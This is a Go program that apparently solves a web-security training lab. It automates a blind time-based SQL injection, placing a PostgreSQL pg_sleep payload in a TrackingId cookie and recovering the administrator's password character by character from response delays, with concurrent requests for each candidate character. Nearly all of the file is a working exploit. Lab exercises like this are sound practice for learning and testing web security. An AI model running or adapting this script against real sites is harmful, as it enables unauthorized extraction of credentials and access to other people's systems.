package main

import (
	"fmt"
	"net/http"
	"strconv"
	"sync"
	"time"
)

var (
	timeDelaySec    float64 = 3.0
	timeDelaySecStr         = strconv.Itoa(int(timeDelaySec))
	mainUrl                 = "https://0a63005604ab8ed68094946300f9002e.web-security-academy.net"
	// mainUrl       = "http://localhost:3333"
)

func main() {
	maxPasswordLength := 25
	resChan := make(chan string, maxPasswordLength)

	// i MUST be equal to 1 NOT to 0 in the beginning
	// because SUBSTR(password, 0, 1) is the same as SUBSTR(password, 1, 1)
	for i := 1; i < maxPasswordLength; i++ {
		iteration := strconv.Itoa(i)
		fmt.Println("iteration: " + iteration)
		var wg sync.WaitGroup

		minAsciiChar := 32
		maxAsciiChar := 127
		for asciiChar := minAsciiChar; asciiChar < maxAsciiChar; asciiChar++ {
			wg.Add(1)
			go flow(&wg, resChan, string(rune(asciiChar)), iteration)
		}

		wg.Wait()
	}

	resStr := ""
	numOfCharsInChannel := len(resChan)
	if numOfCharsInChannel > 0 {
		for i := 0; i < numOfCharsInChannel; i++ {
			resStr += <-resChan
		}
	}
	fmt.Println("res:")
	fmt.Println(resStr)
}

func flow(wg *sync.WaitGroup, resChan chan string, ch, charNum string) {
	defer wg.Done()

	cookie := "TrackingId=yXIQDkw8Dfm6XJs8'%3BSELECT CASE WHEN ((SELECT SUBSTR(password, " + charNum + ", 1) FROM users WHERE username = 'administrator')='" + ch + "') THEN pg_sleep(" + timeDelaySecStr + ") ELSE pg_sleep(0) END--; session=PzQeFsR8qhCAQsIiCCc63Uo3osS8zIje"

	start := time.Now()
	resp := makeHttpReq(http.MethodGet, mainUrl, "", cookie, true)
	end := time.Now()
	// rawHttpLikeOutput(resp, true)
	defer resp.Body.Close()

	durationSec := end.Sub(start).Seconds()

	if durationSec > timeDelaySec {
		resChan <- ch
		fmt.Println(ch)
	}
}
